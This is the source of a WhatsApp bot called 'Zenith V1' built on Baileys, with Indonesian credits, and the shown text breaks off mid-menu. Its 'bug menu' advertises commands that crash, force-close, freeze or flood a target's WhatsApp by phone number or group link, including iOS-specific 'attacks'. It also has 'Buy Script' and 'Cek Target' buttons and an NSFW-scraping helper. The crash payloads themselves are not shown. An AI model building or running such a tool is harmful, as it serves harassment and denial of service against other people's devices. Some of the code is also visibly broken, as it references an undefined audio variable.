/*
#Baca!! 
- Riname Seperlunya Aja Biar Kagak Eror, Kalo Eror Tanggung Sendiri!! 
- Gk Usah Hapus Credits Kalo Mau Hapus Minimal Kasih Credits Di Tqto🤓
- Credits : Ken
~ No Sell No Send Ke Pt Lu Pake Buat Pribadi Aja Anjeng
~ Terima Kasih
*/

require('./config');
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const vm = require('vm');
const sharp = require('sharp')
const pino = require('pino');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const figlet = require('figlet');
const gradient = require('gradient-string');
const readline = require("readline");
const logger = pino({ level: 'debug' });
const search = require("yt-search");
const { youtube } = require("btch-downloader");
const { Client } = require('ssh2');
const crypto = require('crypto');
const cheerio = require('cheerio');
const deniedCooldown = new Map();
const COOLDOWN = 5 * 60 * 1000;
const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')

module.exports = depayy = async (depayy, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        const content = JSON.stringify(m.message)
        
        const isText = ["extendedTextMessage", "conversation"].includes(m.mtype)
		const isImage = ["imageMessage"].includes(m.mtype)
		const isVideo = ["videoMessage"].includes(m.mtype)
		const isSticker = ["stickerMessage"].includes(m.mtype)
		const isAudio = ["audioMessage"].includes(m.mtype) && !(m.message[m.mtype]?.ptt)
		const isVoice = ["audioMessage"].includes(m.mtype) && !!(m.message[m.mtype]?.ptt)
		const isViewOnce = ["viewOnceMessageV2", "viewOnceMessage"].includes(m.mtype)
		const isContact = ["contactMessage", "contactsArrayMessage"].includes(m.mtype)
		const isLocation = ["locationMessage"].includes(m.mtype)
		const isDocument = ["documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isProtocol = ["protocolMessage"].includes(m.mtype)
		const isPollUpdate = ["pollUpdateMessage"].includes(m.mtype)
		const isPollCreation = ["pollCreationMessage"].includes(m.mtype)
		const isButtonList = ["interactiveResponseMessage"].includes(m.mtype)
		const isButtonReply = ["templateButtonReplyMessage"].includes(m.mtype)
		const isAllMedia = ["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "viewOnceMessageV2", "viewOnceMessage", "contactMessage", "contactsArrayMessage", "locationMessage", "documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
        
        const sender = m.key.fromMe ? depayy.user.id.split(":")[0] + "@s.whatsapp.net" || depayy.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = global.prefa
        const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : ''
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
        const reseller = JSON.parse(fs.readFileSync("./database/reseller.json"))
        const contacts = JSON.parse(fs.readFileSync("./database/ctcs.json"))
        const unli = JSON.parse(fs.readFileSync("./database/unli.json"))
        const OWNER_PATH = "./database/owner.json"
        const ownerbot = JSON.parse(fs.readFileSync(OWNER_PATH))
        const isOwner = ownerbot.includes(sender)
        const isUnli = unli.includes(m.chat)
        const botNumber = await depayy.decodeJid(depayy.user.id);
        const isPremium = premium.includes(m.sender)
        const isReseller = reseller.includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const isCreator = [botNumber, ...ownerbot, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        const groupMetadata = isGroup ? await depayy.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;        
        const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, capital } = require('./library/myfunction');
 
// Foto
const nika = fs.readFileSync('./image/depay.jpg')
const img = fs.readFileSync('./image/kelpin.jpg')
const musik = fs.readFileSync('./image/sawit.mp3')

const {
    imageToWebp, 
    videoToWebp, 
    writeExifImg, 
    writeExifVid, 
    writeExif, 
    addExif 
} = require('./library/exif')      

if (!depayy.public && !isCreator) return;

if (m.message) {
    console.log(chalk.cyan.bold(`▢ New Message`));
    console.log(
        chalk.blue(
            `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
            `   ⌬ Pesan: ${m.body || m.mtype} \n` +
            `   ⌬ Pengirim: ${pushname} \n` +
            `   ⌬ JID: ${senderNumber}`
        )
    );
    
    if (m.isGroup) {
        console.log(
            chalk.blue(
                `   ⌬ Grup: ${groupName} \n` +
                `   ⌬ GroupJid: ${m.chat}`
            )
        );
    }
    console.log();
}

// Function
function getGreeting(hour) {
  if (hour >= 0 && hour < 5) return "Late Night 🌌";
  else if (hour >= 5 && hour < 10) return "Good Morning 🌅";
  else if (hour >= 10 && hour < 15) return "Good Noon ☀️";
  else if (hour >= 15 && hour < 18) return "Good Afternoon 🌇";
  else if (hour >= 18 && hour < 19) return "Good Evening 🌆";
  else if (hour >= 19 && hour < 23) return "Good Night 🌃";
  else return "Midnight 🌌";
}

const nowJakarta = moment().tz('Asia/Jakarta');
const nowMakassar = moment().tz('Asia/Makassar');
const nowJayapura = moment().tz('Asia/Jayapura');
const hariIni = nowJakarta.format('dddd, DD MMMM YYYY');
const wib = nowJakarta.format('HH:mm:ss');
const wita = nowMakassar.format('HH:mm:ss');
const wit = nowJayapura.format('HH:mm:ss');   
const ucapanJakarta = getGreeting(parseInt(nowJakarta.format('HH')));
const ucapanMakassar = ucapanJakarta;
const ucapanJayapura = ucapanJakarta;

const example = (teks) => {
return `\n *Cara Penggunaan Command :*\n *${prefix+command}* ${teks}\n`
}
  
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `Ken`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=628895916513:628895916513\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    liveLocationMessage: {
      degreesLatitude: -6.9175,
      degreesLongitude: 107.6191,
      caption: "Ken\n𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏", 
      sequenceNumber: "1656662991",
      contextInfo: {
        forwardingScore: 999999,
        isForwarded: true
      }
    }
  }
}

// Zenith Eai
const depayybut = (anu) => {
const {message, key} = generateWAMessageFromContent(m.chat, {
  interactiveMessage: {
    body: {text: anu},
    footer: {text: `Zenith-Ai`},
    nativeFlowMessage: {
      buttons: [{text: "Ken"}
           ],
    }
  },
}, {quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `Zenith - AI`}}})
 depayy.relayMessage(m.chat, {viewOnceMessage:{message}}, {messageId:key.id})
}

// Fansen Nsfw
async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}

// Reply Text
const payreply = async (teks) => {
  let mentionList = []
  let regex = /@?(\d{8,15})/g
  let match

  while ((match = regex.exec(teks)) !== null) {
    let number = match[1]
    let jid = number + "@s.whatsapp.net"
    mentionList.push(jid)
  }
  await depayy.sendMessage(
    m.chat,
    {
      text: teks,
      contextInfo: {
        mentionedJid: mentionList,
        forwardingScore: 999999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363405690100911@newsletter',
          serverMessageId: 145,
          newsletterName: 'Ken Nasgor Goreng',
        },
        externalAdReply: {
          showAdAttribution: false,
          containsAutoReply: true,
          title: 'Ken',
          body: 'ZENITH V1',
          previewType: 'VIDEO',
          thumbnailUrl: 'https://files.catbox.moe/2e3824.jpg',
          sourceUrl: 'https://whatsapp.com'
        }
      }
    },
    {
      quoted: {
        key: {
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: 'status@broadcast'
        },
        message: {
          conversation: '𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏'
        }
      }
    }
  )
}

async function replybug(teks, target) {
    let jid = (target || m.sender).split('@')[0]

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363405690100911@newsletter",
                            newsletterName: `Ken Nasgor Goreng`,
                            serverMessageId: 145
                        }
                    },
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: teks
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: `© Ken`
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        subtitle: "",
                        hasMediaAttachment: true,
                        ...(await prepareWAMessageMedia({ image: { url: `https://files.catbox.moe/2e3824.jpg` } }, { upload: depayy.waUploadToServer })),
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"https://wa.me/628895916513\",\"merchant_url\":\"https://www.google.com\"}`
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: `{\"display_text\":\"Cek Target\",\"url\":\"https://wa.me/${jid}\",\"merchant_url\":\"https://www.google.com\"}`
                            }
                        ],
                    }),
                })
            }
        }
    }, { quoted: m })

    await depayy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    })
}

// Reply Text Bak Gb
async function replybug2(teks) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363405690100911@newsletter",
newsletterName: `Ken Nasgor Goreng`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© Ken`
}),
header: proto.Message.InteractiveMessage.Header.create({
  title: ``,
  subtitle: "",
  hasMediaAttachment: true,
  ...(await prepareWAMessageMedia(
    { image: { url: "https://files.catbox.moe/2e3824.jpg" } },
    { upload: depayy.waUploadToServer }
  )),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Developer Information\",\"url\":\"https://whatsapp.com/channel/0029VbBC3Qs29758iEaLcf1Y\",\"merchant_url\":\"https://www.google.com\"}`
}],
}), })}
}}, {quoted: lol})
await depayy.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

// Reply Database
async function replydebe(teks) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363405690100911@newsletter",
newsletterName: `Ken Nasgor Goreng`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© Ken`
}),
header: proto.Message.InteractiveMessage.Header.create({
  title: ``,
  subtitle: "",
  hasMediaAttachment: true,
  ...(await prepareWAMessageMedia(
    { image: { url: "https://files.catbox.moe/2e3824.jpg" } },
    { upload: depayy.waUploadToServer }
  )),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Akses\",\"url\":\"https://wa.me/628895916513\",\"merchant_url\":\"https://www.google.com\"}`
}],
}), })}
}}, {quoted: lol})
await depayy.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

if (
    global.swgb2?.[m.sender] &&
    m.message?.interactiveResponseMessage
) {
    try {
        let json = JSON.parse(
            m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson
        )

        let jid = json.id

        let data = global.swgb2[m.sender]
        let quoted = data.quoted
        let caption = data.caption

        const mime = (quoted.msg || quoted).mimetype || ""

        if (/image/.test(mime)) {
            const media = await depayy.downloadMediaMessage(quoted)

            await depayy.sendMessage(jid, {
                groupStatusMessage: {
                    image: media,
                    caption
                }
            })
        } else if (/video/.test(mime)) {
            const media = await depayy.downloadMediaMessage(quoted)

            await depayy.sendMessage(jid, {
                groupStatusMessage: {
                    video: media,
                    caption
                }
            })
        } else {
            await depayy.sendMessage(jid, {
                groupStatusMessage: {
                    text: caption
                }
            })
        }

        delete global.swgb2[m.sender]

        payreply("✅ Status berhasil dikirim")
    } catch (e) {
        console.log(e)
    }
}
   
switch(command) {

case "menu":
case "kenshi":
case "v1": {

const nowJakarta = moment().tz('Asia/Jakarta')

await depayy.sendMessage(m.chat, {
react: {
text: "☠️",
key: m.key
}
})

let teks = `\`𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏\`

Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))}

I'm Zenith, your WhatsApp assistant ✨

*DUNIA INI HANYA PERMAINAN, JIKA TIDAK INGIN DIPERMAINKAN MAKA BERMAINLAH*

⌲ \`𝐈𝐍𝐅𝐎 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ Name Bot : Zenith
┃✦ Developer : Ken
┃✦ Version : V1
┃✦ Runtime : ${runtime(process.uptime())}
┃✦ Mode : ${depayy.public ? "Public" : "Self"}
┃✦ Language : JavaScript
┃✦ Status : Premium
┗━━━━━━━━━━━━━━━━

⌲ \`𝐎𝐖𝐍𝐄𝐑\`
┃ TikTok : tiktok.com/@kenz_1111_
┃ Telegram : t.me/Kentyzzz1
┗━━━━━━━━━━━━━━━━`

const msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {

interactiveMessage: proto.Message.InteractiveMessage.create({

body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),

footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Zenith V1"
}),

header: proto.Message.InteractiveMessage.Header.create({
hasMediaAttachment: true,

imageMessage: (
await prepareWAMessageMedia(
{
image: {
url: "https://files.catbox.moe/2e3824.jpg"
}
},
{
upload: depayy.waUploadToServer
}
)
).imageMessage
}),

contextInfo: {
isForwarded: true,
forwardingScore: 999999,

forwardedNewsletterMessageInfo: {
newsletterJid: "120363405690100911@newsletter",
newsletterName: "Ken Nasgor Goreng",
serverMessageId: 145
}
},

nativeFlowMessage:
proto.Message.InteractiveMessage.NativeFlowMessage.create({

messageParamsJson: JSON.stringify({

limited_time_offer: {
text: "𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏",
url: "https://t.me/Kentyzzz1",
copy_code: "ZENITH-V1",
expiration_time: Date.now() * 999
},

bottom_sheet: {
in_thread_buttons_limit: 2,
divider_indices: [1,2,3,4],
list_title: "CLICK HERE",
button_title: "ZENITH"
}

}),

buttons: [

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ KENSHII",
id: ".allmenu"
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ IS ZENITH",
id: ".bugmenu"
})
},

{
name: "cta_call",
buttonParamsJson: JSON.stringify({
display_text: "Call Developer",
id: "628895916513"
})
},

{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Telegram Dev",
url: "https://t.me/Kentyzzz1",
merchant_url: "https://t.me/Kentyzzz1"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Copy Version",
copy_code: "ZENITH-V1"
})
},

{
name: "single_select",
buttonParamsJson: JSON.stringify({

title: "© Zenith V1",

sections: [
{
title: "List Menu",
highlight_label: "Top Feature 🚀",

rows: [

{
title: "𝐀𝐋𝐋 𝐌𝐄𝐍𝐔",
description: "Displays all bot commands",
id: ".allmenu"
},

{
title: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔",
description: "Displays bug features",
id: ".bugmenu"
},

{
title: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔",
description: "Displays owner features",
id: ".ownermenu"
},

{
title: "𝐅𝐔𝐍 𝐌𝐄𝐍𝐔",
description: "Displays fun features",
id: ".funmenu"
},

{
title: "𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔",
description: "Displays panel features",
id: ".cpanelmenu"
},

{
title: "𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎",
description: "Support list",
id: ".tqto"
},

{
title: "𝐒𝐂𝐑𝐈𝐏𝐓",
description: "Displays script info",
id: ".script"
},

{
title: "𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑",
description: "Developer contact",
id: ".owner"
}

]
}
]

})
}

]

})

})

}
}
},
{ quoted: lol }
)

await depayy.relayMessage(
m.chat,
msg.message,
{
messageId: msg.key.id
}
)

await depayy.sendMessage(
m.chat,
{
audio: sawit,
mimetype: "audio/mp4",
ptt: false
},
{
quoted: qkontak
}
)

}
break
case "bugmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await depayy.sendMessage(m.chat, { react: { text: "☠️", key: m.key } });

    let teks = `\`𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏\`
    
Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm Zenith, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. Just send what you need and I'll do my best to assist you. ✨
    
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ *Name Bot  » Zenith*
┃✦ *Developer » Ken*
┃✦ *Version  »  V1*
┃✦ *Language » JavaScript*
┃✦ *RunTime   » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${depayy.public ? "Public" : "Self"}*
┃✦ TypeScript : *JavaScript*
┃✦ *StatusScript  » buyVip/buyer*
┗━━━━━━━━━━━━━━━━━━

\`[洛] 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐁𝐔𝐆 [洛]\`

   \`[ 𝐅𝐎𝐑𝐂𝐋𝐎𝐒𝐄 ]\`
→ .crash 628xxx
→ .ken-crashv2 628xxx
→ .ken-forclose 628xxx
→ .crash-onemsg 628xxx
→ .fc-invis 628xxx
→ .forclose 628xxx

    \`[ 𝐃𝐄𝐋𝐀𝐘 ]\`
→ .delay-god 628xxx
→ .delay-zenith 628xxx
→ .delay-hard 628xxx
→ .delay-maker 628xxx

  \`[ 𝐃𝐄𝐋𝐀𝐘 𝐁𝐄𝐁𝐀𝐒 𝐒𝐏𝐀𝐌 ]\`
→ .delay-spam 628xxx

   \`[ 𝐁𝐔𝐋𝐃𝐎𝐙𝐄𝐑 ]\`
→ .zenith-bulldozer 628xxx
→ .zenith-delay 628xxx
→ .zenith-bulldozerv2 628xxx

   \`[ 𝐔𝐈 ]\`
→ .frezee-chat 628xxx
→ .blank-zenith 628xxx
   
   \`[ 𝐈𝐎𝐒 ]\`
→ .zenith-ios 628xxx
→ .ios-attack 628xxx

\`[洛] 𝐓𝐄𝐒𝐅𝐔𝐍𝐓𝐈𝐎𝐍 [洛]\`
→ .testfunction

\`[洛] 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 [洛]\`
→ .delay-gb *Link Group*
→ .blank-gb *Link Group*
`

const msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {

interactiveMessage: proto.Message.InteractiveMessage.create({

body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),

footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Zenith V1"
}),

header: proto.Message.InteractiveMessage.Header.create({
hasMediaAttachment: true,

imageMessage: (
await prepareWAMessageMedia(
{
image: {
url: "https://files.catbox.moe/2e3824.jpg"
}
},
{
upload: depayy.waUploadToServer
}
)
).imageMessage
}),

contextInfo: {
isForwarded: true,
forwardingScore: 999999,

forwardedNewsletterMessageInfo: {
newsletterJid: "120363405690100911@newsletter",
newsletterName: "Ken Nasgor Goreng",
serverMessageId: 145
}
},

nativeFlowMessage:
proto.Message.InteractiveMessage.NativeFlowMessage.create({

messageParamsJson: JSON.stringify({

limited_time_offer: {
text: "𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏",
url: "https://t.me/Kentyzzz1",
copy_code: "ZENITH-V1",
expiration_time: Date.now() * 999
},

bottom_sheet: {
in_thread_buttons_limit: 2,
divider_indices: [1,2,3,4],
list_title: "CLICK HERE",
button_title: "ZENITH"
}

}),

buttons: [

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ KENSHII",
id: ".allmenu"
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ IS ZENITH",
id: ".bugmenu"
})
},

{
name: "cta_call",
buttonParamsJson: JSON.stringify({
display_text: "Call Developer",
id: "628895916513"
})
},

{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Telegram Dev",
url: "https://t.me/Kentyzzz1",
merchant_url: "https://t.me/Kentyzzz1"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Copy Version",
copy_code: "ZENITH-V1"
})
},

{
name: "single_select",
buttonParamsJson: JSON.stringify({

title: "© Zenith V1",

sections: [
{
title: "List Menu",
highlight_label: "Top Feature 🚀",

rows: [

{
title: "𝐀𝐋𝐋 𝐌𝐄𝐍𝐔",
description: "Displays all bot commands",
id: ".allmenu"
},

{
title: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔",
description: "Displays bug features",
id: ".bugmenu"
},

{
title: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔",
description: "Displays owner features",
id: ".ownermenu"
},

{
title: "𝐅𝐔𝐍 𝐌𝐄𝐍𝐔",
description: "Displays fun features",
id: ".funmenu"
},

{
title: "𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔",
description: "Displays panel features",
id: ".cpanelmenu"
},

{
title: "𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎",
description: "Support list",
id: ".tqto"
},

{
title: "𝐒𝐂𝐑𝐈𝐏𝐓",
description: "Displays script info",
id: ".script"
},

{
title: "𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑",
description: "Developer contact",
id: ".owner"
}

]
}
]

})
}

]

})

})

}
}
},
{ quoted: lol }
)

await depayy.relayMessage(
m.chat,
msg.message,
{
messageId: msg.key.id
}
)

await depayy.sendMessage(
m.chat,
{
audio: sawit,
mimetype: "audio/mp4",
ptt: false
},
{
quoted: qkontak
}
)

}
break
    case "ownermenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await depayy.sendMessage(m.chat, { react: { text: "☠️", key: m.key } });

    let teks = `\`𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏\`
    
Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm Zenith, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. Just send what you need and I'll do my best to assist you. ✨
       
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ *Name Bot  » Zenith*
┃✦ *Owner » Depayy*
┃✦ *Developer » Ken*
┃✦ *Version  »  V1*
┃✦ *Language » JavaScript*
┃✦ *RunTime   » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${depayy.public ? "Public" : "Self"}*
┃✦ TypeScript : *JavaScript*
┃✦ *StatusScript  » buyVip/buyer*
┗━━━━━━━━━━━━━━━━━━

\`[洛] 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 [洛]\`
→ .addowner
→ .delowner 
→ .addmurbug
→ .delmurbug
→ .addmurbuggc
→ .delmurbuggc
→ .self
→ .public
→ .restart
`

const msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {

interactiveMessage: proto.Message.InteractiveMessage.create({

body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),

footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Zenith V1"
}),

header: proto.Message.InteractiveMessage.Header.create({
hasMediaAttachment: true,

imageMessage: (
await prepareWAMessageMedia(
{
image: {
url: "https://files.catbox.moe/2e3824.jpg"
}
},
{
upload: depayy.waUploadToServer
}
)
).imageMessage
}),

contextInfo: {
isForwarded: true,
forwardingScore: 999999,

forwardedNewsletterMessageInfo: {
newsletterJid: "120363405690100911@newsletter",
newsletterName: "Ken Nasgor Goreng",
serverMessageId: 145
}
},

nativeFlowMessage:
proto.Message.InteractiveMessage.NativeFlowMessage.create({

messageParamsJson: JSON.stringify({

limited_time_offer: {
text: "𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏",
url: "https://t.me/Kentyzzz1",
copy_code: "ZENITH-V1",
expiration_time: Date.now() * 999
},

bottom_sheet: {
in_thread_buttons_limit: 2,
divider_indices: [1,2,3,4],
list_title: "CLICK HERE",
button_title: "ZENITH"
}

}),

buttons: [

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ KENSHII",
id: ".allmenu"
})
},

{
name: "quick_reply",
